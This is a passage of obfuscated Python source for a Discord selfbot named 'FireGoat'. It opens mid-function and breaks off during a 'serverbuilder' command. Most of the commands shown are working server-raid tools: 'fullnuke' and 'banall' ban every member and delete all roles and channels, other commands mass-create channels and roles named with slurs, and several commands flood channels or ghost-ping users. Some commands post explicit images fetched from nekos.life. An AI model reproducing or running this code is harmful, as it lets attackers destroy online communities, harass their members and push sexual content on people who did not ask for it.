        OOO0OO0O000OOOOOO ={'theme':next (OOO00000O0O000O0O ),'locale':random .choice (locales ),'status':next (O0O0000O0000O000O )}#line:1126
        while True :#line:1128
            try :#line:1130
                O00OO000OO0O000O0 .patch ("https://canary.discordapp.com/api/v6/users/@me/settings",headers =O0O00OO00OO0O000O ,json =OOO0OO0O000OOOOOO ,timeout =10 )#line:1134
            except Exception as OOOOO0O0OOO0OOO00 :#line:1136
                print (f"{Fore.RED}[ERROR]: {Fore.YELLOW}{OOOOO0O0OOO0OOO00}"+Fore .RESET )#line:1138
            else :#line:1140
                break #line:1142
@FireGoat .command ()#line:1152
async def buildtemplate1 (OOOOO0OOO00O00OOO ):#line:1154
    await OOOOO0OOO00O00OOO .message .delete ()#line:1156
    O0OO00OOO00OOOOO0 =discord .Embed (color =RandomColor ())#line:1158
    O0OO00OOO00OOOOO0 .set_author (name ="🌀 Server builder by selfbot_FireGoat. has been opened, look at your browser 🌀 ",icon_url ="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png")#line:1160
    await OOOOO0OOO00O00OOO .send (embed =O0OO00OOO00OOOOO0 )#line:1162
    await os .system ('start https://discord.new/SMMSun7GdpYu')#line:1164
@FireGoat .command ()#line:1168
async def buildtemplate2 (OO00OOOO00OOOOOO0 ):#line:1170
    await OO00OOOO00OOOOOO0 .message .delete ()#line:1172
    OOOOO0OOO0000OO0O =discord .Embed (color =RandomColor ())#line:1174
    OOOOO0OOO0000OO0O .set_author (name ="🌀 Server builder by selfbot_FireGoat. has been opened, look at your browser 🌀 ",icon_url ="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png")#line:1176
    await OO00OOOO00OOOOOO0 .send (embed =OOOOO0OOO0000OO0O )#line:1178
    await os .system ('start https://discord.new/veyj3wFzesAA')#line:1180
@FireGoat .command ()#line:1184
async def buildtemplate3 (OOOOOO00OOOOOO00O ):#line:1186
    await OOOOOO00OOOOOO00O .message .delete ()#line:1188
    OOO000000000OOO00 =discord .Embed (color =RandomColor ())#line:1190
    OOO000000000OOO00 .set_author (name ="🌀 Server builder by selfbot_FireGoat. has been opened, look at your browser 🌀 ",icon_url ="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png")#line:1192
    await OOOOOO00OOOOOO00O .send (embed =OOO000000000OOO00 )#line:1194
    await os .system ('start https://discord.new/tvY9ZKHncjtX')#line:1196
@FireGoat .command ()#line:1200
async def buildtemplate4 (OO00OOOOOOO0O00OO ):#line:1202
    await OO00OOOOOOO0O00OO .message .delete ()#line:1204
    O00O00O0O0OO0OO00 =discord .Embed (color =RandomColor ())#line:1206
    O00O00O0O0OO0OO00 .set_author (name ="🌀 Server builder by selfbot_FireGoat. has been opened, look at your browser 🌀 ",icon_url ="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png")#line:1208
    await OO00OOOOOOO0O00OO .send (embed =O00O00O0O0OO0OO00 )#line:1210
    await os .system ('start https://discord.new/GgYFQPUysYcN')#line:1212
@FireGoat .command ()#line:1216
async def buildtemplate5 (OOOOOOO000O00OOOO ):#line:1218
    await OOOOOOO000O00OOOO .message .delete ()#line:1220
    OO0000O00O0O00OOO =discord .Embed (color =RandomColor ())#line:1222
    OO0000O00O0O00OOO .set_author (name ="🌀 Server builder by selfbot_FireGoat. has been opened, look at your browser 🌀 ",icon_url ="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png")#line:1224
    await OOOOOOO000O00OOOO .send (embed =OO0000O00O0O00OOO )#line:1226
    await os .system ('start https://discord.new/vPGV28Mz3UeQ')#line:1228
@FireGoat .command ()#line:1232
async def buildtemplate6 (O00000O00OOOO0OOO ):#line:1234
    await O00000O00OOOO0OOO .message .delete ()#line:1236
    OO0OO0O00O0OO00O0 =discord .Embed (color =RandomColor ())#line:1238
    OO0OO0O00O0OO00O0 .set_author (name ="🌀 Server builder by selfbot_FireGoat. has been opened, look at your browser 🌀 ",icon_url ="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png")#line:1240
    await O00000O00OOOO0OOO .send (embed =OO0OO0O00O0OO00O0 )#line:1242
    await os .system ('start https://discord.new/QzQyYmy9JSDj')#line:1244
@FireGoat .command ()#line:1248
async def buildtemplate7 (OO000OOO0000OOO0O ):#line:1250
    await OO000OOO0000OOO0O .message .delete ()#line:1252
    O0OO0O00000OO0OOO =discord .Embed (color =RandomColor ())#line:1254
    O0OO0O00000OO0OOO .set_author (name ="🌀 Server builder by selfbot_FireGoat. has been opened, look at your browser 🌀 ",icon_url ="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png")#line:1256
    await OO000OOO0000OOO0O .send (embed =O0OO0O00000OO0OOO )#line:1258
    await os .system ('start https://discord.new/4yrAHugrqSgH')#line:1260
@FireGoat .command ()#line:1264
async def buildtemplate8 (OOO0OO0000O0O0O00 ):#line:1266
    await OOO0OO0000O0O0O00 .message .delete ()#line:1268
    O00000O00OO0O000O =discord .Embed (color =RandomColor ())#line:1270
    O00000O00OO0O000O .set_author (name ="🌀 Server builder by selfbot_FireGoat. has been opened, look at your browser 🌀 ",icon_url ="https://cdn.discordapp.com/attachments/797861362214633492/800709476873273354/unknown-removebg.png")#line:1272
    await OOO0OO0000O0O0O00 .send (embed =O00000O00OO0O000O )#line:1274
    await os .system ('start https://discord.new/8u7ca3jJmh7a')#line:1276
@FireGoat .command ()#line:1283
async def hentai (O000O0000OOOOOOO0 ):#line:1285
    OO0O000O0O0OO0000 =requests .get ("https://nekos.life/api/v2/img/hentai")#line:1287
    OOO0O0OOOO0OOO00O =OO0O000O0O0OO0000 .json ()#line:1289
    O000OOO000OO00000 =discord .Embed (color =RandomColor ())#line:1291
    O000OOO000OO00000 .set_image (url =OOO0O0OOOO0OOO00O ["url"])#line:1293
    await O000O0000OOOOOOO0 .message .delete ()#line:1295
    await O000O0000OOOOOOO0 .send (embed =O000OOO000OO00000 )#line:1297
@FireGoat .command ()#line:1305
async def waifu (OOO000000O00O0OOO ):#line:1307
    O000OO00O0O00000O =requests .get ("https://nekos.life/api/v2/img/waifu")#line:1309
    OOO0OO0O000O0O0OO =O000OO00O0O00000O .json ()#line:1311
    O0000000O000O00OO =discord .Embed (color =RandomColor ())#line:1313
    O0000000O000O00OO .set_image (url =OOO0OO0O000O0O0OO ["url"])#line:1315
    await OOO000000O00O0OOO .message .delete ()#line:1317
    await OOO000000O00O0OOO .send (embed =O0000000O000O00OO )#line:1319
@FireGoat .command ()#line:1327
async def fox (O00OO000O00O00O0O ):#line:1329
    O000OOOOOO0O0O000 =requests .get ("https://nekos.life/api/v2/img/fox_girl")#line:1331
    O000OOOOO0OO00OOO =O000OOOOOO0O0O000 .json ()#line:1333
    OO0OO0000OOOO0000 =discord .Embed (color =RandomColor ())#line:1335
    OO0OO0000OOOO0000 .set_image (url =O000OOOOO0OO00OOO ["url"])#line:1337
    await O00OO000O00O00O0O .message .delete ()#line:1339
    await O00OO000O00O00O0O .send (embed =OO0OO0000OOOO0000 )#line:1341
@FireGoat .command ()#line:1347
async def tits (OOOO0OO0O0OOOOO00 ):#line:1349
    OOOO0000O0O00OO00 =requests .get ("https://nekos.life/api/v2/img/tits")#line:1351
    OOO0O000000O000OO =OOOO0000O0O00OO00 .json ()#line:1353
    OOOOOOO0O0OO00OO0 =discord .Embed (color =RandomColor ())#line:1355
    OOOOOOO0O0OO00OO0 .set_image (url =OOO0O000000O000OO ["url"])#line:1357
    await OOOO0OO0O0OOOOO00 .message .delete ()#line:1359
    await OOOO0OO0O0OOOOO00 .send (embed =OOOOOOO0O0OO00OO0 )#line:1361
@FireGoat .command ()#line:1367
async def pussy (O0OOOO000000OOOOO ):#line:1369
    OOOO00000OO00OOOO =requests .get ("https://nekos.life/api/v2/img/pussy_jpg")#line:1371
    O00OOOO0000OOOOO0 =OOOO00000OO00OOOO .json ()#line:1373
    OO00000OOOOO000OO =discord .Embed (color =RandomColor ())#line:1375
    OO00000OOOOO000OO .set_image (url =O00OOOO0000OOOOO0 ["url"])#line:1377
    await O0OOOO000000OOOOO .message .delete ()#line:1379
    await O0OOOO000000OOOOO .send (embed =OO00000OOOOO000OO )#line:1381
@FireGoat .command ()#line:1391
async def hentaigif (O00OO00O0OO0OOOO0 ):#line:1393
    OOOOO0OOO00O00O0O =requests .get ("https://nekos.life/api/v2/img/Random_hentai_gif")#line:1395
    OO0OO000O0O000OOO =OOOOO0OOO00O00O0O .json ()#line:1397
    O000O0O0OO0OOO0OO =discord .Embed (color =RandomColor ())#line:1399
    O000O0O0OO0OOO0OO .set_image (url =OO0OO000O0O000OOO ["url"])#line:1401
    await O00OO00O0OO0OOOO0 .message .delete ()#line:1403
    await O00OO00O0OO0OOOO0 .send (embed =O000O0O0OO0OOO0OO )#line:1405
@FireGoat .command ()#line:1411
async def boobsgif (O000O0000OOOOO0OO ):#line:1413
    O0OOO0O000O00O00O =requests .get ("https://nekos.life/api/v2/img/boobs")#line:1415
    O000OO00OOOO0OO0O =O0OOO0O000O00O00O .json ()#line:1417
    OOO0OOO00000OO00O =discord .Embed (color =RandomColor ())#line:1419
    OOO0OOO00000OO00O .set_image (url =O000OO00OOOO0OO0O ["url"])#line:1421
    await O000O0000OOOOO0OO .message .delete ()#line:1423
    await O000O0000OOOOO0OO .send (embed =OOO0OOO00000OO00O )#line:1425
@FireGoat .command ()#line:1431
async def pussygif (OO0OO00OOO0OO00OO ):#line:1433
    OO000000OOO00O0OO =requests .get ("https://nekos.life/api/v2/img/pussy")#line:1435
    O0O000OO0O00OOO00 =OO000000OOO00O0OO .json ()#line:1437
    OO000OO0OO0000O00 =discord .Embed (color =RandomColor ())#line:1439
    OO000OO0OO0000O00 .set_image (url =O0O000OO0O00OOO00 ["url"])#line:1441
    await OO0OO00OOO0OO00OO .message .delete ()#line:1443
    await OO0OO00OOO0OO00OO .send (embed =OO000OO0OO0000O00 )#line:1445
@FireGoat .command ()#line:1451
async def cumgif (O00000O0OOOOOOO00 ):#line:1453
    O0OO0OO0O0O0OOOOO =requests .get ("https://nekos.life/api/v2/img/cum")#line:1455
    O00OO0O0O000OOO0O =O0OO0OO0O0O0OOOOO .json ()#line:1457
    OO0OO00O00O0O0O00 =discord .Embed (color =RandomColor ())#line:1459
    OO0OO00O00O0O0O00 .set_image (url =O00OO0O0O000OOO0O ["url"])#line:1461
    await O00000O0OOOOOOO00 .message .delete ()#line:1463
    await O00000O0OOOOOOO00 .send (embed =OO0OO00O00O0O0O00 )#line:1465
@FireGoat .command ()#line:1471
async def kunigif (O0OO0OO0O00O00O0O ):#line:1473
    OO00000O0OO0O00O0 =requests .get ("https://nekos.life/api/v2/img/kuni")#line:1475
    OOOOOO00OO0O00O00 =OO00000O0OO0O00O0 .json ()#line:1477
    O000O000O0000000O =discord .Embed (color =RandomColor ())#line:1479
    O000O000O0000000O .set_image (url =OOOOOO00OO0O00O00 ["url"])#line:1481
    await O0OO0OO0O00O00O0O .message .delete ()#line:1483
    await O0OO0OO0O00O00O0O .send (embed =O000O000O0000000O )#line:1485
@FireGoat .command ()#line:1495
async def spoiler (OOOO00O00O000O0OO ,*,message ):#line:1497
    await OOOO00O00O000O0OO .message .delete ()#line:1499
    await OOOO00O00O000O0OO .send (f"||{message}||")#line:1501
@FireGoat .command ()#line:1507
async def streaming (O000O00OOO0OOOOOO ,*,message ):#line:1509
    await O000O00OOO0OOOOOO .message .delete ()#line:1511
    OO0OO0OOOO00000O0 =discord .Streaming (name =message ,url ="",)#line:1519
    await FireGoat .change_presence (activity =OO0OO0OOOO00000O0 )#line:1521
@FireGoat .command ()#line:1525
async def playing (OOOOO0O0O00OO0O0O ,*,message ):#line:1527
    await OOOOO0O0O00OO0O0O .message .delete ()#line:1529
    OOO0OO000OOO0OO0O =discord .Game (name =message )#line:1535
    await FireGoat .change_presence (activity =OOO0OO000OOO0OO0O )#line:1537
@FireGoat .command ()#line:1541
async def listening (OO000O000000O0OO0 ,*,message ):#line:1543
    await OO000O000000O0OO0 .message .delete ()#line:1545
    await FireGoat .change_presence (activity =discord .Activity (type =discord .ActivityType .listening ,name =message ,))#line:1555
@FireGoat .command ()#line:1559
async def watching (OOOO0O0OOO000O000 ,*,message ):#line:1561
    await OOOO0O0OOO000O000 .message .delete ()#line:1563
    await FireGoat .change_presence (activity =discord .Activity (type =discord .ActivityType .watching ,name =message ))#line:1573
@FireGoat .command ()#line:1577
async def tinyurl (OO00O00OOO00O00OO ,*,link ):#line:1579
    await OO00O00OOO00O00OO .message .delete ()#line:1581
    O000OO0OOO00O0OO0 =requests .get (f"http://tinyurl.com/api-create.php?url={link}").text #line:1583
    await OO00O00OOO00O00OO .send (f"{O000OO0OOO00O0OO0}")#line:1585
@FireGoat .command ()#line:1594
async def banall (O0OO00OO000O00OO0 ):#line:1596
    """Bans all members in the guild the command is used"""#line:1598
    await O0OO00OO000O00OO0 .message .delete ()#line:1600
    for OO00O0OO0000O00O0 in O0OO00OO000O00OO0 .guild .members :#line:1602
        try :#line:1604
            await OO00O0OO0000O00O0 .ban ()#line:1606
        except Exception as OOOOOOO0000O0O00O :#line:1608
            print (f"{Fore.RED}[-]banAll => {Fore.RESET}Failed to ban {OO00O0OO0000O00O0}\n{OOOOOOO0000O0O00O}\n")#line:1614
@FireGoat .command (name ='group-leaver',aliase =['leaveallgroups','leavegroup','leavegroups',"groupleave","groupleaver"])#line:1620
async def _O0000O0O0000OOO0O (O0OOOOO0O0O0OOOO0 ):#line:1622
    await O0OOOOO0O0O0OOOO0 .message .delete ()#line:1624
    for OO0OOO00O00OOO000 in FireGoat .private_channels :#line:1626
        if isinstance (OO0OOO00O00OOO000 ,discord .GroupChannel ):#line:1628
            await OO0OOO00O00OOO000 .leave ()#line:1630
@FireGoat .command ()#line:1634
async def rolecreate (OOOO00OOO00000O0O ):#line:1636
    await OOOO00OOO00000O0O .message .delete ()#line:1638
    for O0OOO0OOOO0OO00OO in range (1 ,25 ):#line:1640
        try :#line:1642
            await OOOO00OOO00000O0O .guild .create_role (name =f"🌀 RAPED BY FireGoat.🌀",color =RandomColor ())#line:1644
        except :#line:1646
            print (f"{Fore.RED}[+]ROLE => {Fore.RESET}Failed to create role: {role}")#line:1648
@FireGoat .command ()#line:1652
async def channelcreate (OOO0OO000OO0O0000 ):#line:1654
    """Spams the everloving fuck outta the channels voice text and category\nNote: It's a pain in the ass to clean up"""#line:1656
    await OOO0OO000OO0O0000 .message .delete ()#line:1658
    for OO000O0OOO0O00O0O in range (1 ,1000 ):#line:1660
        try :#line:1662
            await OOO0OO000OO0O0000 .guild .create_text_channel (name =f"🌀NUKED-BY-FireGoat.🌀-{OO000O0OOO0O00O0O}")#line:1668
            await OOO0OO000OO0O0000 .guild .create_voice_channel (name =f"🌀NUKED BY FireGoat.🌀 {OO000O0OOO0O00O0O}")#line:1674
            await OOO0OO000OO0O0000 .guild .create_category (name =f"🌀NUKED BY FireGoat.🌀 {OO000O0OOO0O00O0O}")#line:1680
        except :#line:1682
            print (f"{Fore.RED}[+]CHANNEL => {Fore.RESET}Failed to create: {channel}")#line:1684
@FireGoat .command ()#line:1688
async def channeldelete (OOO000OO0O0O00OO0 ):#line:1690
    """Deletes any and every channel it can delete"""#line:1692
    await OOO000OO0O0O00OO0 .send ("🌀Deleting all channels...")#line:1694
    for OOOO000000OO00OO0 in OOO000OO0O0O00OO0 .guild .channels :#line:1696
        try :#line:1698
            await OOOO000000OO00OO0 .delete ()#line:1700
        except :#line:1702
            print (f"{Fore.RED}[-]CHANNEL => {Fore.RESET}Failed to delete: {OOOO000000OO00OO0}")#line:1704
@FireGoat .command ()#line:1708
async def roledelete (OOO0OOO0OOO00OOO0 ):#line:1710
    """Deletes every role except roles above you or bot specific roles like dyno"""#line:1712
    await OOO0OOO0OOO00OOO0 .message .delete ()#line:1714
    O0O0O000O00O0OO0O =OOO0OOO0OOO00OOO0 .guild .roles #line:1716
    O0O0O000O00O0OO0O .pop (0 )#line:1718
    for OOO00O0OOO0OOOOOO in O0O0O000O00O0OO0O :#line:1720
        if OOO0OOO0OOO00OOO0 .guild .roles [-1 ]>OOO00O0OOO0OOOOOO :#line:1722
            try :#line:1724
                await OOO00O0OOO0OOOOOO .delete ()#line:1726
            except :#line:1728
                print (f"{Fore.RED}[-]ROLE => {Fore.RESET}Failed to delete: {OOO00O0OOO0OOOOOO}")#line:1730
@FireGoat .command ()#line:1736
async def fulldelete (O00O00OO00OO0OO00 ):#line:1738
    """Deletes every role except roles above you and deletes every channel"""#line:1740
    await O00O00OO00OO0OO00 .message .delete ()#line:1742
    OOO0O0OOOO0O00OO0 =O00O00OO00OO0OO00 .guild .roles #line:1744
    OOO0O0OOOO0O00OO0 .pop (0 )#line:1746
    for OOO0OOO0OOO00000O in OOO0O0OOOO0O00OO0 :#line:1748
        if O00O00OO00OO0OO00 .guild .roles [-1 ]>OOO0OOO0OOO00000O :#line:1750
            try :#line:1752
                await OOO0OOO0OOO00000O .delete ()#line:1754
            except :#line:1756
                print (f"{Fore.RED}[-]ROLE => {Fore.RESET}Failed to delete role: {OOO0OOO0OOO00000O}")#line:1762
    for OO0O0O00000000OOO in O00O00OO00OO0OO00 .guild .channels :#line:1764
        try :#line:1766
            await OO0O0O00000000OOO .delete ()#line:1768
        except :#line:1770
            print (f"{Fore.RED}[-]CHANNEL => {Fore.RESET}Failed to delete: {OO0O0O00000000OOO}")#line:1772
@FireGoat .command ()#line:1780
async def fullnuke (OOO00OOOO00O0000O ):#line:1782
    """Nukes the fucking shit outta the server banning everyone silently. While no one notices\nNext up it deletes all roles  then creates FireGoat. roles\nThen it deletes all channels possible to then make FireGoat. channels"""#line:1784
    await OOO00OOOO00O0000O .message .delete ()#line:1786
    OOO0OOOOOOO0O00OO =OOO00OOOO00O0000O .guild .roles #line:1788
    OOO0OOOOOOO0O00OO .pop (0 )#line:1790
    for OO0OOO0O0O0O00O00 in OOO0OOOOOOO0O00OO :#line:1792
        if OOO00OOOO00O0000O .guild .roles [-1 ]>OO0OOO0O0O0O00O00 :#line:1794
            try :#line:1796
                await OO0OOO0O0O0O00O00 .delete ()#line:1798
            except :#line:1800
                print (f"{Fore.RED}[-]ROLE => {Fore.RESET}Failed to delete role: {OO0OOO0O0O0O00O00}")#line:1806
    for OOO0O00OOO000O00O in range (1 ,50 ):#line:1810
        try :#line:1812
            await OOO00OOOO00O0000O .guild .create_role (await OOO00OOOO00O0000O .guild .create_role (name =f"🌀RAPED BY FireGoat.🌀 {OOO0O00OOO000O00O}",color =RandomColor ()))#line:1818
        except Exception as OOOO000OOO0O0000O :#line:1820
            print (f"Error while makign role.\n\nError: {OOOO000OOO0O0000O}")#line:1822
    for O0OOO000OO0OOO000 in OOO00OOOO00O0000O .guild .channels :#line:1829
        try :#line:1831
            await O0OOO000OO0OOO000 .delete ()#line:1833
        except :#line:1835
            print (f"{Fore.RED}[-]CHANNEL => {Fore.RESET}Failed to delete {O0OOO000OO0OOO000}")#line:1837
            print ()#line:1843
    for O0O00OO0O0OO00O0O in OOO00OOOO00O0000O .guild .members :#line:1847
        try :#line:1849
            await O0O00OO0O0OO00O0O .ban ()#line:1851
            await OOO00OOOO00O0000O .message .delete ()#line:1853
        except :#line:1855
            print (f"{Fore.RED}[-]BANNING => {Fore.RESET}Failed to ban {O0O00OO0O0OO00O0O}")#line:1857
    for OOO0O00OOO000O00O in range (1 ,100 ):#line:1861
        try :#line:1863
            await OOO00OOOO00O0000O .guild .create_text_channel (name =f"NUKED-BY-FireGoat-{OOO0O00OOO000O00O}")#line:1869
            print (f"{Fore.RED}[-]CHANNEL => {Fore.RESET}🌀Made text channel! NUKED-BY-FireGoat🌀-{OOO0O00OOO000O00O}")#line:1875
            await OOO00OOOO00O0000O .guild .create_voice_channel (name =f"NUKED BY FireGoat {OOO0O00OOO000O00O}")#line:1881
            print (f"{Fore.RED}[-]CHANNEL => {Fore.RESET}🌀Made voice channel! NUKED BY FireGoat🌀 {OOO0O00OOO000O00O} ")#line:1887
            await OOO00OOOO00O0000O .guild .create_category (name =f"NUKED BY FireGoat {OOO0O00OOO000O00O}")#line:1893
            print (f"{Fore.RED}[-]CHANNEL => {Fore.RESET}🌀Made category! NUKED BY FireGoat🌀 {OOO0O00OOO000O00O} ")#line:1899
        except Exception as OOOO000OOO0O0000O :#line:1901
            print (f"Error while making channels\nError: {OOOO000OOO0O0000O}")#line:1903
@FireGoat .command ()#line:1915
async def txtspam (OOOOOOOO0OO0O0O0O ,OOOOOO000O0O000OO :int ,*,message ):#line:1916
    await OOOOOOOO0OO0O0O0O .message .delete ()#line:1917
    for _O0OOOOO0OO0OO0OOO in range (OOOOOO000O0O000OO ):#line:1918
        await OOOOOOOO0OO0O0O0O .send (f'{message}\n'*25 )#line:1919
        await asyncio .sleep (0.1 )#line:1920
@FireGoat .command ()#line:1924
async def memespam (O0O00O00OOOOOOO00 ):#line:1926
    for O0O00OOO00OOO00OO in range (50 ):#line:1928
        OOOOOOO0OO0000OOO =requests .get ("https://some-random-api.ml/meme").json ()#line:1930
        OOOOO00OO00OO0OO0 =discord .Embed (color =RandomColor ())#line:1932
        OOOOO00OO00OO0OO0 .set_author (name ="You are gettign bombed with memes by 🌀selfbot_FireGoat.",icon_url ="https://freepngimg.com/thumb/internet_meme/3-2-troll-face-meme-png-thumb.png")#line:1934
        OOOOO00OO00OO0OO0 .set_image (url =str (OOOOOOO0OO0000OOO ["image"]))#line:1936
        await O0O00O00OOOOOOO00 .message .delete ()#line:1938
        await O0O00O00OOOOOOO00 .send (embed =OOOOO00OO00OO0OO0 )#line:1940
@FireGoat .command ()#line:1948
async def hentaispam (O00OO0OO0O00000O0 ):#line:1950
    OO0OO00OO0OOOOO0O =requests .get ("https://nekos.life/api/v2/img/Random_hentai_gif")#line:1952
    O0O000O0O000OO0OO =OO0OO00OO0OOOOO0O .json ()#line:1954
    OO00OO00OOOO0O0O0 =discord .Embed (color =RandomColor ())#line:1956
    OO00OO00OOOO0O0O0 .set_image (url =O0O000O0O000OO0OO ["url"])#line:1958
    OOO00O000OOOOOO0O =requests .get ("https://nekos.life/api/v2/img/Random_hentai_gif")#line:1962
    O0O000O0O000OO0OO =OOO00O000OOOOOO0O .json ()#line:1964
    OOO00OO0O0OOO0O0O =discord .Embed (color =RandomColor ())#line:1966
    OOO00OO0O0OOO0O0O .set_image (url =O0O000O0O000OO0OO ["url"])#line:1968
    O000OOOO000OOO0OO =requests .get ("https://nekos.life/api/v2/img/Random_hentai_gif")#line:1972
    O0O000O0O000OO0OO =O000OOOO000OOO0OO .json ()#line:1974
    OO0O0O0O0O000O0OO =discord .Embed (color =RandomColor ())#line:1976
    OO0O0O0O0O000O0OO .set_image (url =O0O000O0O000OO0OO ["url"])#line:1978
    O0O0O0O000OOO000O =requests .get ("https://nekos.life/api/v2/img/Random_hentai_gif")#line:1982
    O0O000O0O000OO0OO =O0O0O0O000OOO000O .json ()#line:1984
    OO0O00OO0O00OOOOO =discord .Embed (color =RandomColor ())#line:1986
    OO0O00OO0O00OOOOO .set_image (url =O0O000O0O000OO0OO ["url"])#line:1988
    O00O000OOO0OO0O00 =requests .get ("https://nekos.life/api/v2/img/Random_hentai_gif")#line:1992
    O0O000O0O000OO0OO =O00O000OOO0OO0O00 .json ()#line:1994
    OO00OO0O0OO0O0O00 =discord .Embed (color =RandomColor ())#line:1996
    OO00OO0O0OO0O0O00 .set_image (url =O0O000O0O000OO0OO ["url"])#line:1998
    OO00000OOOO0OO0OO =requests .get ("https://nekos.life/api/v2/img/Random_hentai_gif")#line:2002
    O0O000O0O000OO0OO =OO00000OOOO0OO0OO .json ()#line:2004
    OO0000O000000O000 =discord .Embed (color =RandomColor ())#line:2006
    OO0000O000000O000 .set_image (url =O0O000O0O000OO0OO ["url"])#line:2008
    OOO0O000O0O0000O0 =requests .get ("https://nekos.life/api/v2/img/Random_hentai_gif")#line:2012
    O0O000O0O000OO0OO =OOO0O000O0O0000O0 .json ()#line:2014
    O0OOOO0OOOO000O0O =discord .Embed (color =RandomColor ())#line:2016
    O0OOOO0OOOO000O0O .set_image (url =O0O000O0O000OO0OO ["url"])#line:2018
    OO000O0OO0OOO0OOO =requests .get ("https://nekos.life/api/v2/img/Random_hentai_gif")#line:2022
    O0O000O0O000OO0OO =OO000O0OO0OOO0OOO .json ()#line:2024
    O0O0O0O00O0O0OO0O =discord .Embed (color =RandomColor ())#line:2026
    O0O0O0O00O0O0OO0O .set_image (url =O0O000O0O000OO0OO ["url"])#line:2028
    OO0O0O00000OO0OO0 =requests .get ("https://nekos.life/api/v2/img/boobs")#line:2032
    O0O000O0O000OO0OO =OO0O0O00000OO0OO0 .json ()#line:2034
    O0000000O0OO0O0OO =discord .Embed (color =RandomColor ())#line:2036
    O0000000O0OO0O0OO .set_image (url =O0O000O0O000OO0OO ["url"])#line:2038
    for O00OO00OO0OOOOOOO in range (30 ):#line:2044
        await O00OO0OO0O00000O0 .send (embed =OO00OO00OOOO0O0O0 )#line:2046
        await O00OO0OO0O00000O0 .send (embed =O0000000O0OO0O0OO )#line:2048
        await O00OO0OO0O00000O0 .send (embed =OOO00OO0O0OOO0O0O )#line:2050
        await O00OO0OO0O00000O0 .send (embed =OO0O0O0O0O000O0OO )#line:2052
        await O00OO0OO0O00000O0 .send (embed =OO0O00OO0O00OOOOO )#line:2054
        await O00OO0OO0O00000O0 .send (embed =OO00OO0O0OO0O0O00 )#line:2056
        await O00OO0OO0O00000O0 .send (embed =OO0000O000000O000 )#line:2058
        await O00OO0OO0O00000O0 .send (embed =O0OOOO0OOOO000O0O )#line:2060
        await O00OO0OO0O00000O0 .send (embed =O0O0O0O00O0O0OO0O )#line:2062
@FireGoat .command ()#line:2068
async def blankspam (OOOO0OO00O000OOO0 ):#line:2070
    await OOOO0OO00O000OOO0 .message .delete ()#line:2072
    for OO0O0OO0OOOOOO000 in range (10 ):#line:2074
        await OOOO0OO00O000OOO0 .send ("ﾠﾠ"+"\n"*400 +"ﾠﾠ")#line:2076
@FireGoat .command ()#line:2084
async def numberspam (O000OOOO00OOOOOOO ):#line:2086
    await O000OOOO00OOOOOOO .message .delete ()#line:2088
    for O00O0O0OO0O0000OO in range (50 ):#line:2090
        await O000OOOO00OOOOOOO .send ("10101"*400 )#line:2092
@FireGoat .command ()#line:2096
async def emojispam (O00OO0O0OOOO00OOO ):#line:2098
    for O0OOO00O00O00OOO0 in range (10 ):#line:2100
        await O00OO0O0OOOO00OOO .send ("🤡"*1500 )#line:2102
@FireGoat .command ()#line:2108
async def crashspam (OO00O000O00OOOO00 ):#line:2110
    for O0O0OOO00OO00OOO0 in range (30 ):#line:2112
        await OO00O000O00OOOO00 .send ("🤡🧊"*100 )#line:2114
@FireGoat .command ()#line:2120
async def embedspam (O0O00OO0O00O00OO0 ):#line:2122
    await O0O00OO0O00O00OO0 .message .delete ()#line:2124
    for O0O000O00O0O00OO0 in range (50 ):#line:2126
        OO00O00OOOOO0000O =discord .Embed (color =RandomColor ())#line:2128
        OO00O00OOOOO0000O .set_author (name ="🧊So yea you are getting spammed by selfbot_FireGoat., do you like it?🧊")#line:2130
        await O0O00OO0O00O00OO0 .send (embed =OO00O00OOOOO0000O )#line:2132
@FireGoat .command ()#line:2136
async def pinguser (OO0O0O00OO0O0OOO0 ,OOO0000O00O0O0O00 ):#line:2138
    await OO0O0O00OO0O0OOO0 .message .delete ()#line:2140
    for O000O0OOOOOO00O0O in range (10 ):#line:2142
        OO0O00O0000O0000O =("<@"+OOO0000O00O0O0O00 +">")#line:2144
        await OO0O0O00OO0O0OOO0 .send (OO0O00O0000O0000O *70 )#line:2146
@FireGoat .command ()#line:2152
async def silentping (O0000000O0O00O00O ,OO000OO0OO0O0OO00 ):#line:2154
    await O0000000O0O00O00O .message .delete ()#line:2156
    for OOO00OO000OO00OOO in range (10 ):#line:2158
        O0O0O00OOO000O000 =("<@"+OO000OO0OO0O0OO00 +">")#line:2160
        await O0000000O0O00O00O .send (O0O0O00OOO000O000 *70 )#line:2162
        await O0000000O0O00O00O .send (O0O0O00OOO000O000 *70 )#line:2164
        await O0000000O0O00O00O .send (O0O0O00OOO000O000 *70 )#line:2166
        async for OO000OO0OO0O0OO00 in O0000000O0O00O00O .message .channel .history (limit =3 ).filter (lambda OOOOOOOO0000O00O0 :OOOOOOOO0000O00O0 .author ==FireGoat .user ).map (lambda O0OOOO0O000OO00O0 :O0OOOO0O000OO00O0 ):#line:2168
            try :#line:2170
                await OO000OO0OO0O0OO00 .delete ()#line:2172
            except :#line:2174
                pass #line:2176
@FireGoat .command (aliases =["gp"])#line:2180
async def ghostping (OOOO0OO0OOOO00OO0 ,OOOO0O0O0OO0OOOOO ):#line:2182
    await OOOO0OO0OOOO00OO0 .message .delete ()#line:2184
    for OOO00000OO0O00OO0 in range (1 ):#line:2186
        O0OO0OOO0O000O0OO =("<@"+OOOO0O0O0OO0OOOOO +">")#line:2188
        await OOOO0OO0OOOO00OO0 .send (O0OO0OOO0O000O0OO *70 )#line:2190
        async for OOOO0O0O0OO0OOOOO in OOOO0OO0OOOO00OO0 .message .channel .history (limit =1 ).filter (lambda OO0000O000O0O000O :OO0000O000O0O000O .author ==FireGoat .user ).map (lambda O00O0O0OOOOOO00O0 :O00O0O0OOOOOO00O0 ):#line:2192
            try :#line:2194
                await OOOO0O0O0OO0OOOOO .delete ()#line:2196
            except :#line:2198
                pass #line:2200
@FireGoat .command ()#line:2208
async def serverbuilder (O0OO00OO0OO0OOO0O ):#line:2210
    await O0OO00OO0OO0OOO0O .message .delete ()#line:2212
    O0O0OOOO0O0O0OOOO =discord .Embed (color =RandomColor ())#line:2214
